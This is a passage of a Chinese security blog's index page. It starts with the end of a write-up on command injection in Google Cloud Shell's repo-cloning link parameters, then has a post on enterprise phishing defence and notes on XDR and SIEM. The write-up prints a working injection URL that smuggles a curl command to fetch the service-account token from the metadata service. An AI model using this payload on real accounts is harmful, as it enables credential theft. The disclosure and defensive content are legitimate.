+<p>Cloud Shell 有个功能是可以通过类似下面的链接clone可信代码库的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ssh.cloud.google.com/?git_repo=https://github.com/GoogleCloudPlatform/gsutil</span><br><span class="line">https://ssh.cloud.google.com/?go_get_repo=github.com/google/gops</span><br></pre></td></tr></table></figure>
+<p>但是在配置文件中有个缺陷，git_repo和go_get_repo两个参数同时存在于链接中时，判断逻辑是or，所以只要git_repo和go_get_repo其中一个存在其中就可以，所以可以在go_get_repo参数上添加命令，同时在git_repo上加载可信代码库。</p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>最终构造的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://shell.cloud.google.com/?show=ide&amp;go_get_repo=%22;curl%200/service-accounts/default/token;%23&amp;git_repo=github.com/GoogleCloudPlatform/gsutil</span><br></pre></td></tr></table></figure>
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Fri Jun 10 2022 21:00:00 GMT+0800">2022-06-10</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/Cloud/">Cloud</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Cloud%20I%20Hack%20into%20Google%20Cloud/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E4%BB%A5%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97%E4%B8%BA%E6%A0%B8%E5%BF%83%E2%80%94%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC(%E6%9D%A5%E8%87%AA%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E7%9A%84%E5%90%AF%E7%A4%BA)/">
+                        以攻防对抗为核心—如何防御网络钓鱼(来自国家反诈的启示)
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        引子昨天处理了一个简单的钓鱼事件，同时结合最近准备攻防对抗的一些思考，简单聊一下“如何应对网络钓鱼”这个难题。
+网络钓鱼有哪几种网络诈骗钓鱼类型
+
+预付金诈骗（贪）
+帐户停用诈骗（怕）
+伪造网站诈骗（粗心）
+…
+
+网络攻击钓鱼方式
+
+鱼叉式网络钓鱼
+克隆网络钓鱼
+捕鲸诈骗
+…
+
+参考自https://www.cloudflare.com/zh-cn/learning/access-management/phishing-attack/
+防钓鱼与反诈骗2021年，国家反诈中心去年共紧急止付涉案资金3200余亿元人民币，拦截诈骗电话15.5亿次、成功避免2800余万名民众受骗。公安机关共破获电信网络诈骗案件44.1万余起，抓获违法犯罪嫌疑人69万余名，打掉涉“两卡”违法犯罪团伙3.9万个，追缴返还人民群众被骗资金120亿元。
+围绕网络钓鱼的攻防对抗，本质上是人性弱点的对抗。在本质上，当前声势浩大的“反电信诈骗”和“防网络钓鱼”是一样的，国家反诈就是最佳实践，所以先来看一下国家是如何做“反诈骗”的。
+反诈之防骗意识之“淹没式宣传”对于如何提升广大群众的防骗意识，国家采用的是地毯式、淹没式的铺天盖地的宣导，无论是各种奇形怪状的口号、传单，还是“本小区本月发生xx起诈骗事件，被骗xx元”，基本上就是按住你的脑袋，从眼睛、耳朵里灌输防骗意识。
+这样的做法笔者是非常认同的，虽然没有一个具体的数据来说明这样做的效果，但是从笔者自身的经验来说，在曾经被骗过一次之前，自负满满的认为自己不会被网络诈骗，然后打脸打的啪啪响（金额不大），曾经很长一段时间引以为耻。相信在看本文的读者应该也认为自己不会被骗，大忌。
+反诈之安装“国家反诈APP”相信现在没有人的手机上没有这个APP了吧，挨家挨户的地毯式安装，各种网络直播宣传等等，相当于每个人的手机上都装了一个“EDR”。
+反诈之“国家反诈APP”之“来电预警守护”为什么要在每个手机上装上反诈APP，核心作用就是和大数据威胁情报关联，当诈骗电话进线或接收短信的时候可以实时识别和预警。
+反诈之异常网站访问告警应该很多人都收到过当地派出所打电话过来说“你xx时间是不是访问了xx网站，这个网站涉嫌电信诈骗……”
+来自“国家反诈骗”的启示——企业如何防御网络钓鱼从上一小节可以看到，为了反诈骗，国家的主要手段是“意识宣导”、“覆盖EDR”、“威胁情报告警(实时)”和“网站访问日志分析(延时)”等等，这几个做法和我们日常建设防网络钓鱼基本大同小异，但是如何做好这几部分，是需要和“国家反诈中心”认真学习的。
+意识宣导总结下反诈骗的宣导，“形式多样”、“案例真实”、“题材丰富”、“高频次”、“一对一”等等，之前看到的一个演讲中也提到了同样的点，核心就在于“重复”。
+
+在真实的企业安全环境中，在没有切实感受到钓鱼危害之前，是很难做到这点的，更多的是发一发全员邮件告诉大家小心网络钓鱼，这种做法的作用基本为零，毕竟每天来自各个团队的宣传邮件早就把邮箱填满了。
+不过在企业防网络钓鱼的宣导上，比反诈骗有一个最大的优势，因为性质的不同，可以进行“网络钓鱼演习”。
+如何进行网络钓鱼演习？
+演习必须要真实 何为真实，就是不论是邮箱、域名、网站还是文案，都要和员工息息相关，而不是在邮件里写“我来钓鱼了”，emmm 参考：《你好，捕鱼人》https://vipread.com/library/topic/3233
+
+全员参与（特别是TL） 在演练结束后的复盘中，可以做到层层团队的内部宣导和复盘，我们往往对发生在身边的事件更能有体感
+
+重复重复重复 投入资源，阶段性重复、多样性演练、复盘，直到受害者成为零
+
+
+进行安全意识考试（不）其实笔者不太喜欢考试的这种形式，但是不得不说，考试是可以让员工在百忙之中快速学习某些知识的有效手段，同时还可以比较容易的量化工作成果，这或许就是为什么现在有这么多考试的原因吧。
+不过如果做好激励，也许能成为一个好的宣导方式。
+防网络钓鱼策略像“外部邮箱变色”、“URL跳转弹窗”这些方式基本上每个企业邮箱/企业IM都具备了，然后再深一点，会做“SPF IP地址验证”、“DKIM 数字签名验证”、“DMARC From地址验证”等协议验证，这些手段可以有效的防止垃圾邮件和外部恶意邮件。
+但是因为业务的复杂性，往来邮件的多样，这些协议策略很难完整的上线，同时也会因为配置策略问题，存在各种绕过的可能性。
+所以目前的趋势是“钓鱼邮件的智能检测”，不过这是一个大工程，目前有效的落地实践应该并不多，更多的还是在特殊时期采用特殊策略。
+
+（图源Splunk）
+
+（图源Fireeye https://www.fireeye.com/company/press-releases/2019/fireeye-secure-email-gateway-protects-against-threats-others-mis.html）
+
+（《邮件防线的攻防研究实践》https://vipread.com/library/topic/3699）
+发生钓鱼攻击事件后的应急响应
+止血 当通过各种途径或知到某员工收到钓鱼邮件后，第一时间并行做两件事：止血该员工和获取其他收到钓鱼邮件/消息的员工列表
+
+修复 将相关IP、URL、邮箱等恶意信息加入黑名单，同时排查为什么会绕过恶意邮件防御策略    
+
+溯源 通过相关线索进行溯源，判断钓鱼攻击类型，来决定后续采取相应措施
+
+复盘/宣导 如果有员工中招，要重点复盘 如果是员工主动发现，要有激励 同时，真实的CASE一定要把握住进行宣导
+
+
+最后当然了，做了再多，人性也是永远的弱点，但是多做一点，风险就少一分。
+持续对抗才是安全的魅力所在。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>昨天处理了一个简单的钓鱼事件，同时结合最近准备攻防对抗的一些思考，简单聊一下“如何应对网络钓鱼”这个难题。</p>
+<h2 id="网络钓鱼有哪几种"><a href="#网络钓鱼有哪几种" class="headerlink" title="网络钓鱼有哪几种"></a>网络钓鱼有哪几种</h2><p>网络诈骗钓鱼类型</p>
+<ul>
+<li>预付金诈骗（贪）</li>
+<li>帐户停用诈骗（怕）</li>
+<li>伪造网站诈骗（粗心）</li>
+<li>…</li>
+</ul>
+<p>网络攻击钓鱼方式</p>
+<ul>
+<li>鱼叉式网络钓鱼</li>
+<li>克隆网络钓鱼</li>
+<li>捕鲸诈骗</li>
+<li>…</li>
+</ul>
+<p>参考自<a class="link" target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/learning/access-management/phishing-attack/">https://www.cloudflare.com/zh-cn/learning/access-management/phishing-attack/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="防钓鱼与反诈骗"><a href="#防钓鱼与反诈骗" class="headerlink" title="防钓鱼与反诈骗"></a>防钓鱼与反诈骗</h2><p>2021年，国家反诈中心去年共紧急止付涉案资金3200余亿元人民币，拦截诈骗电话15.5亿次、成功避免2800余万名民众受骗。公安机关共破获电信网络诈骗案件44.1万余起，抓获违法犯罪嫌疑人69万余名，打掉涉“两卡”违法犯罪团伙3.9万个，追缴返还人民群众被骗资金120亿元。</p>
+<p>围绕网络钓鱼的攻防对抗，本质上是人性弱点的对抗。在本质上，当前声势浩大的“反电信诈骗”和“防网络钓鱼”是一样的，国家反诈就是最佳实践，所以先来看一下国家是如何做“反诈骗”的。</p>
+<h3 id="反诈之防骗意识之“淹没式宣传”"><a href="#反诈之防骗意识之“淹没式宣传”" class="headerlink" title="反诈之防骗意识之“淹没式宣传”"></a>反诈之防骗意识之“淹没式宣传”</h3><p>对于如何提升广大群众的防骗意识，国家采用的是地毯式、淹没式的铺天盖地的宣导，无论是各种奇形怪状的口号、传单，还是“本小区本月发生xx起诈骗事件，被骗xx元”，基本上就是按住你的脑袋，从眼睛、耳朵里灌输防骗意识。</p>
+<p>这样的做法笔者是非常认同的，虽然没有一个具体的数据来说明这样做的效果，但是从笔者自身的经验来说，在曾经被骗过一次之前，自负满满的认为自己不会被网络诈骗，然后打脸打的啪啪响（金额不大），曾经很长一段时间引以为耻。相信在看本文的读者应该也认为自己不会被骗，大忌。</p>
+<h3 id="反诈之安装“国家反诈APP”"><a href="#反诈之安装“国家反诈APP”" class="headerlink" title="反诈之安装“国家反诈APP”"></a>反诈之安装“国家反诈APP”</h3><p>相信现在没有人的手机上没有这个APP了吧，挨家挨户的地毯式安装，各种网络直播宣传等等，相当于每个人的手机上都装了一个“EDR”。</p>
+<h3 id="反诈之“国家反诈APP”之“来电预警守护”"><a href="#反诈之“国家反诈APP”之“来电预警守护”" class="headerlink" title="反诈之“国家反诈APP”之“来电预警守护”"></a>反诈之“国家反诈APP”之“来电预警守护”</h3><p>为什么要在每个手机上装上反诈APP，核心作用就是和大数据威胁情报关联，当诈骗电话进线或接收短信的时候可以实时识别和预警。</p>
+<h3 id="反诈之异常网站访问告警"><a href="#反诈之异常网站访问告警" class="headerlink" title="反诈之异常网站访问告警"></a>反诈之异常网站访问告警</h3><p>应该很多人都收到过当地派出所打电话过来说“你xx时间是不是访问了xx网站，这个网站涉嫌电信诈骗……”</p>
+<h2 id="来自“国家反诈骗”的启示——企业如何防御网络钓鱼"><a href="#来自“国家反诈骗”的启示——企业如何防御网络钓鱼" class="headerlink" title="来自“国家反诈骗”的启示——企业如何防御网络钓鱼"></a>来自“国家反诈骗”的启示——企业如何防御网络钓鱼</h2><p>从上一小节可以看到，为了反诈骗，国家的主要手段是“意识宣导”、“覆盖EDR”、“威胁情报告警(实时)”和“网站访问日志分析(延时)”等等，这几个做法和我们日常建设防网络钓鱼基本大同小异，但是如何做好这几部分，是需要和“国家反诈中心”认真学习的。</p>
+<h3 id="意识宣导"><a href="#意识宣导" class="headerlink" title="意识宣导"></a>意识宣导</h3><p>总结下反诈骗的宣导，“形式多样”、“案例真实”、“题材丰富”、“高频次”、“一对一”等等，之前看到的一个演讲中也提到了同样的点，核心就在于“重复”。</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>在真实的企业安全环境中，在没有切实感受到钓鱼危害之前，是很难做到这点的，更多的是发一发全员邮件告诉大家小心网络钓鱼，这种做法的作用基本为零，毕竟每天来自各个团队的宣传邮件早就把邮箱填满了。</p>
+<p>不过在企业防网络钓鱼的宣导上，比反诈骗有一个最大的优势，因为性质的不同，可以进行“网络钓鱼演习”。</p>
+<h4 id="如何进行网络钓鱼演习？"><a href="#如何进行网络钓鱼演习？" class="headerlink" title="如何进行网络钓鱼演习？"></a>如何进行网络钓鱼演习？</h4><ol>
+<li><p>演习必须要真实<br> 何为真实，就是不论是邮箱、域名、网站还是文案，都要和员工息息相关，而不是在邮件里写“我来钓鱼了”，emmm<br> 参考：《你好，捕鱼人》<a class="link" target="_blank" rel="noopener" href="https://vipread.com/library/topic/3233">https://vipread.com/library/topic/3233<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>全员参与（特别是TL）<br> 在演练结束后的复盘中，可以做到层层团队的内部宣导和复盘，我们往往对发生在身边的事件更能有体感</p>
+</li>
+<li><p>重复重复重复<br> 投入资源，阶段性重复、多样性演练、复盘，直到受害者成为零</p>
+</li>
+</ol>
+<h4 id="进行安全意识考试（不）"><a href="#进行安全意识考试（不）" class="headerlink" title="进行安全意识考试（不）"></a>进行安全意识考试（不）</h4><p>其实笔者不太喜欢考试的这种形式，但是不得不说，考试是可以让员工在百忙之中快速学习某些知识的有效手段，同时还可以比较容易的量化工作成果，这或许就是为什么现在有这么多考试的原因吧。</p>
+<p>不过如果做好激励，也许能成为一个好的宣导方式。</p>
+<h3 id="防网络钓鱼策略"><a href="#防网络钓鱼策略" class="headerlink" title="防网络钓鱼策略"></a>防网络钓鱼策略</h3><p>像“外部邮箱变色”、“URL跳转弹窗”这些方式基本上每个企业邮箱/企业IM都具备了，然后再深一点，会做“SPF IP地址验证”、“DKIM 数字签名验证”、“DMARC From地址验证”等协议验证，这些手段可以有效的防止垃圾邮件和外部恶意邮件。</p>
+<p>但是因为业务的复杂性，往来邮件的多样，这些协议策略很难完整的上线，同时也会因为配置策略问题，存在各种绕过的可能性。</p>
+<p>所以目前的趋势是“钓鱼邮件的智能检测”，不过这是一个大工程，目前有效的落地实践应该并不多，更多的还是在特殊时期采用特殊策略。</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>（图源Splunk）</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>（图源Fireeye <a class="link" target="_blank" rel="noopener" href="https://www.fireeye.com/company/press-releases/2019/fireeye-secure-email-gateway-protects-against-threats-others-mis.html%EF%BC%89">https://www.fireeye.com/company/press-releases/2019/fireeye-secure-email-gateway-protects-against-threats-others-mis.html）<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>（《邮件防线的攻防研究实践》<a class="link" target="_blank" rel="noopener" href="https://vipread.com/library/topic/3699%EF%BC%89">https://vipread.com/library/topic/3699）<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="发生钓鱼攻击事件后的应急响应"><a href="#发生钓鱼攻击事件后的应急响应" class="headerlink" title="发生钓鱼攻击事件后的应急响应"></a>发生钓鱼攻击事件后的应急响应</h3><ol>
+<li><p>止血<br> 当通过各种途径或知到某员工收到钓鱼邮件后，第一时间并行做两件事：止血该员工和获取其他收到钓鱼邮件/消息的员工列表</p>
+</li>
+<li><p>修复<br> 将相关IP、URL、邮箱等恶意信息加入黑名单，同时排查为什么会绕过恶意邮件防御策略    </p>
+</li>
+<li><p>溯源<br> 通过相关线索进行溯源，判断钓鱼攻击类型，来决定后续采取相应措施</p>
+</li>
+<li><p>复盘/宣导<br> 如果有员工中招，要重点复盘<br> 如果是员工主动发现，要有激励<br> 同时，真实的CASE一定要把握住进行宣导</p>
+</li>
+</ol>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>当然了，做了再多，人性也是永远的弱点，但是多做一点，风险就少一分。</p>
+<p>持续对抗才是安全的魅力所在。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Jun 08 2022 17:00:00 GMT+0800">2022-06-08</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">应用安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/THINK/">THINK</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E4%BB%A5%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97%E4%B8%BA%E6%A0%B8%E5%BF%83%E2%80%94%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC(%E6%9D%A5%E8%87%AA%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E7%9A%84%E5%90%AF%E7%A4%BA)/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E5%85%B3%E4%BA%8EXDR%E7%9A%84%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/">
+                        关于XDR的一点笔记
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        面对攻击者日益先进的战术、技术和程序(TTPs)，仍是一场艰难的战斗。随着大量新且隐蔽的攻击方法出现，我们除了威胁预防外，更需要新的策略和战术去检测和响应。
+当我们的安全团队努力防止针对我们组织的攻击成功时，必须面对一个事实：没有绝对安全的系统，威胁终会到来。
+XDR将EDR、UEBA、NTA、下一代防病毒软件和其他工具的所有功能整合到一个解决方案中，以提供最佳安全性。
+“X”代表任何数据源，无论是网络、端点还是云，重点是通过自动化强制乘以安全运营团队每个成员的生产力。最终目标是确保该类别的产品减少检测和应对威胁的平均时间，而无需增加团队中其他地方的精力。
+如果在自己的环境中不能像攻击者那样灵活，那么就很难有效的防御攻击。
+XDR必须具有跨整个环境的可见性和检测功能，并继承来自端点、网络、云环境的遥测技术。
+通过结合威胁情报来让自己具备应对未知攻击的能力。
+XDR的必要功能：
+1. 支持任意来源的数据输入，一个真正的XDR将允许任何数据与威胁活动相关联
+2. 可扩展的存储和计算能力
+3. 更高更准确的自动化/跨数据分析，自动映射ATT&amp;CK框架，支持分析师进行深入分析
+4. 快速/简单部署
+5. 可视/可理解
+
+十个关键的XDR能力(来自paloalto):
+1. 一流的端点威胁防护能力
+2. 灵活的端点保护能力套件（例如主机防火墙、漏洞评估、磁盘加密、设备控制等）
+3. 跨数据源的扩展可见性
+4. 简化调查，减少时间和降低误报
+5. 通过机器学习来分析
+6. 提供协调一致的反应能力
+7. 安全任务自动化
+8. 独立的测试和验证
+9. 快速的产品升级和优化
+10. 降低安全成本
+
+XDR用例：    与UEBA的解决场景大同小异，可以参考这篇文章《UEBA(用户和实体行为分析)可以用来做什么（十大场景）》
+XDR趋势推动的主要原因：
+1. 分布式企业资产 + 重新定义的边界 + 云/业务转型的成功 = 攻击向量和攻击技术的爆发增长
+2. 范围狭窄的安全解决方案在孤岛中运行
+3. SIEM 经常遭受范围蔓延的困扰，导致复杂的解决方案面临部署挑战
+
+XDR的主要优势应该具备：
+1. 提高检测、保护、响应能力
+2. 提高效率
+3. 省钱
+
+如何提高protection能力：
+•    立即在组件安全产品之间共享本地威胁情报，以有效阻止所有组件的威胁。此外，在多种不同的检测方法（例如网络和端点）中利用外部获得的威胁情报
+•    将来自多个组件的弱信号组合成更强的恶意信号
+•    通过自动关联和确认警报来减少错过的警报
+•    集成相关数据，以实现更快、更准确的警报分类诊断
+•    通过加权指导提供集中配置和硬化功能，以帮助确定活动的优先次序
+如何提高安全运营人员的效率：
+•    将大量警报流转换为需要手动调查的少且准确的事件
+•    提供具有所有安全组件必要上下文的集成事件响应选项，以快速解决警报
+•    提供超出基础设施控制点（即网络和端点）的响应选项
+•    为重复性任务提供自动化能力
+•    通过跨安全组件提供共同的管理和工作流程体验，减少培训和升级支持
+•    提供可用和高质量的检测内容，无需调优
+
+XDR的三大支柱：
+Front-End：
+
+    1. 生成遥测数据
+    2. 执行响应动作或增强安全控制
+
+Back-End：
+
+    1. 从传感器收集和关联数据
+    2. 执行威胁检测
+    3. 自动化告警、事件分类
+    4. 加速事件调查
+    5. 自动化响应检测到的威胁
+
+Content
+
+    以威胁为中心的规范性工作流程
+    1. API connectors
+    2. 解析器
+    3. 检测规则和模型
+    4. 调查和响应指导
+    5. MITRE ATT&amp;CK测绘
+    6. 响应行动和剧本
+    7. 报告
+
+
+XDR的事件处理流程：
+1. 从关键数据源生成安全遥测数据
+2. 将攻击遥测数据关联到一个事件时间线
+3. 自动化根因分析
+4. 借助全面的事件上下文加速威胁狩猎
+5. 推荐应对措施
+
+以威胁为中心的统包式威胁检测、调查和响应 (TDIR) 工作流程：
+收集：
+
+    预定义数据源
+
+检测：
+
+    基于行为的威胁检测
+    观察列表
+    MITRE 映射
+
+分类：
+
+    告警优先级
+    上下文收集和完善
+    自动创建案例
+
+调查：
+
+    为所有实体预构建事件时间表
+    自动化Q&amp;A
+
+响应：
+
+    统包剧本
+    定义事件类型
+    事件检查列表
+
+
+XDR检测案例(Exabeam检测横向移动)：
+数据源：
+
+    登录和访问资产
+    认证和访问管理
+    VPN和零信任网络接入
+    网络接入、分析和监控
+    EDR/EPP日志
+    操作系统日志
+
+检测规则类型：
+
+    Pass the ticket 
+    Pass the hash 
+    远程访问活动异常
+    网络连接和流量异常
+
+MITRE技术：
+
+    T1090: Proxy
+    T1205: Traffic signaling 
+    T1219:  Remote access software
+    T1071: Application layer protocol 
+    T1021: Remote services         
+    T1078: Valid accounts         
+    T1550: Use alternate authentication material 
+
+调查工具：
+
+    威胁猎人保存搜索结果
+    智能时间线
+    调查checklist指南
+
+响应动作：
+
+    邮件通知相关人
+    添加用户和资产到观察列表
+    对事件涉及的用户进行屏蔽、暂停或限制
+    重置凭证/授权
+    通过多因素认证重新身份验证
+    隔离系统
+
+
+SIEM是目前有效的威胁探测和响应工具之一，SIEM的未来是XDR。
+SIEM的价值：
+1. 高级检测，可用于检测特定类型的安全事件
+2. 安全操作， 可用于不同的威胁检测和响应用例
+3. 安全集成，充当其它安全应用的集成平台，如UEBA、SOAR等
+4. 可见性，为整个组织的事件数据提供可见性、合规性和报告
+5. …
+
+SIEM面临的最大挑战：
+1. 软件授权昂贵
+2. 维护和运营SIEM基础设施的成本很高，且需要很多资源和时间
+3. SIEM可以有效的检测已知威胁，但是对于未知威胁却不太有效
+4. SIEM更适合有经验的网络安全分析师使用
+5. SIEM基础设施部署需要复杂而漫长的部署周期
+6. …
+
+XDR与零信任
+XDR 可以发挥关键作用，充当集成端到端零信任架构的中枢神经系统， 它在整个网络和环境中提供实时可见性和警报，监控核心策略的执行，提供上下文洞察力，并授权团队在需要时采取快速行动。
+XDR的风险：
+就目前而言，XDR仍是一个新兴的待验证的安全产品，大量的优势仍然存在某些特定案例或者PPT上。
+
+SOAPA(    security operations and analytics platform architecture)
+一个为规模、集成、高级分析和过程自动化而构建的架构。（ESG提出）
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>面对攻击者日益先进的战术、技术和程序(TTPs)，仍是一场艰难的战斗。随着大量新且隐蔽的攻击方法出现，我们除了威胁预防外，更需要新的策略和战术去检测和响应。</p>
+<p>当我们的安全团队努力防止针对我们组织的攻击成功时，必须面对一个事实：没有绝对安全的系统，威胁终会到来。</p>
+<p>XDR将EDR、UEBA、NTA、下一代防病毒软件和其他工具的所有功能整合到一个解决方案中，以提供最佳安全性。</p>
+<p>“X”代表任何数据源，无论是网络、端点还是云，重点是通过自动化强制乘以安全运营团队每个成员的生产力。最终目标是确保该类别的产品减少检测和应对威胁的平均时间，而无需增加团队中其他地方的精力。</p>
+<p>如果在自己的环境中不能像攻击者那样灵活，那么就很难有效的防御攻击。</p>
+<p>XDR必须具有跨整个环境的可见性和检测功能，并继承来自端点、网络、云环境的遥测技术。</p>
+<p>通过结合威胁情报来让自己具备应对未知攻击的能力。</p>
+<p>XDR的必要功能：</p>
+<pre><code>1. 支持任意来源的数据输入，一个真正的XDR将允许任何数据与威胁活动相关联
+2. 可扩展的存储和计算能力
+3. 更高更准确的自动化/跨数据分析，自动映射ATT&amp;CK框架，支持分析师进行深入分析
+4. 快速/简单部署
+5. 可视/可理解
+</code></pre>
+<p>十个关键的XDR能力(来自paloalto):</p>
+<pre><code>1. 一流的端点威胁防护能力
+2. 灵活的端点保护能力套件（例如主机防火墙、漏洞评估、磁盘加密、设备控制等）
+3. 跨数据源的扩展可见性
+4. 简化调查，减少时间和降低误报
+5. 通过机器学习来分析
+6. 提供协调一致的反应能力
+7. 安全任务自动化
+8. 独立的测试和验证
+9. 快速的产品升级和优化
+10. 降低安全成本
+</code></pre>
+<p>XDR用例：<br>    与UEBA的解决场景大同小异，可以参考这篇文章<a href="https://blog.langu.xyz/2022/03/15/UEBA(%E7%94%A8%E6%88%B7%E5%92%8C%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90)%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%88%E5%8D%81%E5%A4%A7%E5%9C%BA%E6%99%AF%EF%BC%89/">《UEBA(用户和实体行为分析)可以用来做什么（十大场景）》</a></p>
+<p>XDR趋势推动的主要原因：</p>
+<pre><code>1. 分布式企业资产 + 重新定义的边界 + 云/业务转型的成功 = 攻击向量和攻击技术的爆发增长
+2. 范围狭窄的安全解决方案在孤岛中运行
+3. SIEM 经常遭受范围蔓延的困扰，导致复杂的解决方案面临部署挑战
+</code></pre>
+<p>XDR的主要优势应该具备：</p>
+<pre><code>1. 提高检测、保护、响应能力
+2. 提高效率
+3. 省钱
+</code></pre>
+<p>如何提高protection能力：</p>
+<p>•    立即在组件安全产品之间共享本地威胁情报，以有效阻止所有组件的威胁。此外，在多种不同的检测方法（例如网络和端点）中利用外部获得的威胁情报</p>
+<p>•    将来自多个组件的弱信号组合成更强的恶意信号</p>
+<p>•    通过自动关联和确认警报来减少错过的警报</p>
+<p>•    集成相关数据，以实现更快、更准确的警报分类诊断</p>
+<p>•    通过加权指导提供集中配置和硬化功能，以帮助确定活动的优先次序</p>
+<p>如何提高安全运营人员的效率：</p>
+<p>•    将大量警报流转换为需要手动调查的少且准确的事件</p>
+<p>•    提供具有所有安全组件必要上下文的集成事件响应选项，以快速解决警报</p>
+<p>•    提供超出基础设施控制点（即网络和端点）的响应选项</p>
+<p>•    为重复性任务提供自动化能力</p>
+<p>•    通过跨安全组件提供共同的管理和工作流程体验，减少培训和升级支持</p>
+<p>•    提供可用和高质量的检测内容，无需调优</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>XDR的三大支柱：</p>
+<pre><code>Front-End：
+
+    1. 生成遥测数据
+    2. 执行响应动作或增强安全控制
+
+Back-End：
+
+    1. 从传感器收集和关联数据
+    2. 执行威胁检测
+    3. 自动化告警、事件分类
+    4. 加速事件调查
+    5. 自动化响应检测到的威胁
+
+Content
+
+    以威胁为中心的规范性工作流程
+    1. API connectors
+    2. 解析器
+    3. 检测规则和模型
+    4. 调查和响应指导
+    5. MITRE ATT&amp;CK测绘
+    6. 响应行动和剧本
+    7. 报告
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>XDR的事件处理流程：</p>
+<pre><code>1. 从关键数据源生成安全遥测数据
+2. 将攻击遥测数据关联到一个事件时间线
+3. 自动化根因分析
+4. 借助全面的事件上下文加速威胁狩猎
+5. 推荐应对措施
+</code></pre>
+<p>以威胁为中心的统包式威胁检测、调查和响应 (TDIR) 工作流程：</p>
+<pre><code>收集：
+
+    预定义数据源
+
+检测：
+
+    基于行为的威胁检测
+    观察列表
+    MITRE 映射
+
+分类：
+
+    告警优先级
+    上下文收集和完善
+    自动创建案例
+
+调查：
+
+    为所有实体预构建事件时间表
+    自动化Q&amp;A
+
+响应：
+
+    统包剧本
+    定义事件类型
+    事件检查列表
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>XDR检测案例(Exabeam检测横向移动)：</p>
+<pre><code>数据源：
+
+    登录和访问资产
+    认证和访问管理
+    VPN和零信任网络接入
+    网络接入、分析和监控
+    EDR/EPP日志
+    操作系统日志
+
+检测规则类型：
+
+    Pass the ticket 
+    Pass the hash 
+    远程访问活动异常
+    网络连接和流量异常
+
+MITRE技术：
+
+    T1090: Proxy
+    T1205: Traffic signaling 
+    T1219:  Remote access software
+    T1071: Application layer protocol 
+    T1021: Remote services         
+    T1078: Valid accounts         
+    T1550: Use alternate authentication material 
+
+调查工具：
+
+    威胁猎人保存搜索结果
+    智能时间线
+    调查checklist指南
+
+响应动作：
+
+    邮件通知相关人
+    添加用户和资产到观察列表
+    对事件涉及的用户进行屏蔽、暂停或限制
+    重置凭证/授权
+    通过多因素认证重新身份验证
+    隔离系统
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>SIEM是目前有效的威胁探测和响应工具之一，SIEM的未来是XDR。</p>
+<p>SIEM的价值：</p>
+<pre><code>1. 高级检测，可用于检测特定类型的安全事件
